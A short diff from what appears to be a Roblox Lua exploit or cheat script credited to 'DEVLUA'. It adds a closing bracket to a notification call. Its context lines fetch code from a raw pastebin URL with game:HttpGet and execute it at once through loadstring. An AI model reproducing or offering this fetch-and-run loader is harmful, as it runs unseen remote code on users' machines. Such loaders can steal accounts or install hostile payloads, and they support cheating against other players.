@@ -272,6 +272,7 @@ Title = "PLAYER MODIFY";
 Text = "BY DEVLUA";
 Icon = "";
 Duration = 5;
+})
 wait(1)
 loadstring(game:HttpGet('https://pastebin.com/raw/mKnFjvyu'))()
 end)
